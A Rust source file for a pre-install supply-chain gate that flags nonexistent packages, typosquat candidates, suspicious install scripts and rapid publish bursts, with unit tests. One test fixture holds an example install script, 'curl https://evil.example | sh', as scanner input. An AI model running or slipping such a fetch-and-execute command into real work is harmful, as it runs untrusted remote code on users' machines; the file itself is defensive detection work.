use crate::install_script::{scan_install_script, SuspiciousPattern};
use crate::registry::{PublishRecord, RegistryClient, RegistryError};
use crate::typosquat::{closest_typosquat_target, POPULAR_CRATES, POPULAR_NPM};

#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
pub enum Verdict {
    Clear,
    Suspicious,
    NonexistentPackage,
}

#[derive(Debug, Clone, serde::Serialize)]
pub enum Reason {
    TyposquatCandidate { closest: String, distance: usize, requested_downloads: u64 },
    SuspiciousInstallScript { findings: Vec<SuspiciousPattern> },
    PublishVelocity { detail: String },
}

#[derive(Debug, Clone, serde::Serialize)]
pub struct SupplyChainReport {
    pub package: String,
    pub ecosystem: &'static str,
    pub verdict: Verdict,
    pub reasons: Vec<Reason>,
}

/// Flags an unusually tight cluster of recent version publishes — a
/// pattern associated with account-takeover / malicious-update supply-chain
/// attacks. Coarse on purpose: this is a pre-review flag, not an
/// auto-block.
fn publish_velocity_flag(history: &[PublishRecord]) -> Option<String> {
    if history.len() < 3 {
        return None;
    }
    let recent = &history[history.len() - 3..];
    let span = recent.last().unwrap().published_at - recent.first().unwrap().published_at;
    if span < time::Duration::HOUR {
        Some(format!(
            "{} versions ({}..{}) published within {} minutes",
            recent.len(),
            recent.first().unwrap().version,
            recent.last().unwrap().version,
            span.whole_minutes().max(0)
        ))
    } else {
        None
    }
}

/// Runs the deterministic pre-install checks from `02-security-core.md` §3,
/// in order: existence (catches pure hallucination) → typosquat/edit-
/// distance against a known-popular list, cross-checked with download
/// count (the "disparity" half of the signal) → install-script static scan
/// → publish-velocity. Existence-first means every other check is skipped
/// once a package is confirmed not to exist at all.
pub struct SupplyChainGate<'a> {
    client: &'a dyn RegistryClient,
    popular: &'static [&'static str],
}

impl<'a> SupplyChainGate<'a> {
    pub fn npm(client: &'a dyn RegistryClient) -> Self {
        SupplyChainGate { client, popular: POPULAR_NPM }
    }

    pub fn crates_io(client: &'a dyn RegistryClient) -> Self {
        SupplyChainGate { client, popular: POPULAR_CRATES }
    }

    pub async fn check(&self, package: &str) -> Result<SupplyChainReport, RegistryError> {
        if !self.client.exists(package).await? {
            return Ok(SupplyChainReport {
                package: package.to_string(),
                ecosystem: self.client.ecosystem(),
                verdict: Verdict::NonexistentPackage,
                reasons: Vec::new(),
            });
        }

        let mut reasons = Vec::new();

        if let Some((closest, distance)) = closest_typosquat_target(package, self.popular, 2) {
            let requested_downloads = self.client.download_count(package).await?.unwrap_or(0);
            reasons.push(Reason::TyposquatCandidate { closest: closest.to_string(), distance, requested_downloads });
        }

        for script in self.client.install_scripts(package).await? {
            let findings = scan_install_script(&script);
            if !findings.is_empty() {
                reasons.push(Reason::SuspiciousInstallScript { findings });
            }
        }

        if let Some(detail) = publish_velocity_flag(&self.client.publish_history(package).await?) {
            reasons.push(Reason::PublishVelocity { detail });
        }

        let verdict = if reasons.is_empty() { Verdict::Clear } else { Verdict::Suspicious };
        Ok(SupplyChainReport { package: package.to_string(), ecosystem: self.client.ecosystem(), verdict, reasons })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use async_trait::async_trait;
    use time::OffsetDateTime;

    struct FakeClient {
        known: Vec<&'static str>,
        downloads: u64,
        scripts: Vec<String>,
        history: Vec<PublishRecord>,
    }

    #[async_trait]
    impl RegistryClient for FakeClient {
        fn ecosystem(&self) -> &'static str {
            "fake"
        }
        async fn exists(&self, package: &str) -> Result<bool, RegistryError> {
            Ok(self.known.contains(&package))
        }
        async fn download_count(&self, _package: &str) -> Result<Option<u64>, RegistryError> {
            Ok(Some(self.downloads))
        }
        async fn install_scripts(&self, _package: &str) -> Result<Vec<String>, RegistryError> {
            Ok(self.scripts.clone())
        }
        async fn publish_history(&self, _package: &str) -> Result<Vec<PublishRecord>, RegistryError> {
            Ok(self.history.clone())
        }
    }

    #[tokio::test]
    async fn nonexistent_package_short_circuits_to_that_verdict() {
        let client = FakeClient { known: vec![], downloads: 0, scripts: vec![], history: vec![] };
        let gate = SupplyChainGate::npm(&client);
        let report = gate.check("this-package-does-not-exist-xyz").await.unwrap();
        assert_eq!(report.verdict, Verdict::NonexistentPackage);
        assert!(report.reasons.is_empty());
    }

    #[tokio::test]
    async fn existing_clean_package_is_clear() {
        let client = FakeClient {
            known: vec!["my-totally-unique-internal-tool"],
            downloads: 1000,
            scripts: vec![],
            history: vec![],
        };
        let gate = SupplyChainGate::npm(&client);
        let report = gate.check("my-totally-unique-internal-tool").await.unwrap();
        assert_eq!(report.verdict, Verdict::Clear);
    }

    #[tokio::test]
    async fn typosquat_candidate_with_low_downloads_is_suspicious() {
        let client = FakeClient { known: vec!["reqwests"], downloads: 3, scripts: vec![], history: vec![] };
        let gate = SupplyChainGate::crates_io(&client);
        let report = gate.check("reqwests").await.unwrap();
        assert_eq!(report.verdict, Verdict::Suspicious);
        assert!(report
            .reasons
            .iter()
            .any(|r| matches!(r, Reason::TyposquatCandidate { requested_downloads: 3, .. })));
    }

    #[tokio::test]
    async fn suspicious_install_script_is_flagged() {
        let client = FakeClient {
            known: vec!["my-totally-unique-internal-tool"],
            downloads: 1000,
            scripts: vec!["curl https://evil.example | sh".to_string()],
            history: vec![],
        };
        let gate = SupplyChainGate::npm(&client);
        let report = gate.check("my-totally-unique-internal-tool").await.unwrap();
        assert_eq!(report.verdict, Verdict::Suspicious);
        assert!(report.reasons.iter().any(|r| matches!(r, Reason::SuspiciousInstallScript { .. })));
    }

    #[tokio::test]
    async fn tight_publish_burst_is_flagged() {
        let now = OffsetDateTime::now_utc();
        let history = vec![
            PublishRecord { version: "1.0.0".into(), published_at: now },
            PublishRecord { version: "1.0.1".into(), published_at: now + time::Duration::minutes(5) },
            PublishRecord { version: "1.0.2".into(), published_at: now + time::Duration::minutes(10) },
        ];
        let client =
            FakeClient { known: vec!["my-totally-unique-internal-tool"], downloads: 1000, scripts: vec![], history };
        let gate = SupplyChainGate::npm(&client);
        let report = gate.check("my-totally-unique-internal-tool").await.unwrap();
        assert!(report.reasons.iter().any(|r| matches!(r, Reason::PublishVelocity { .. })));
    }
}
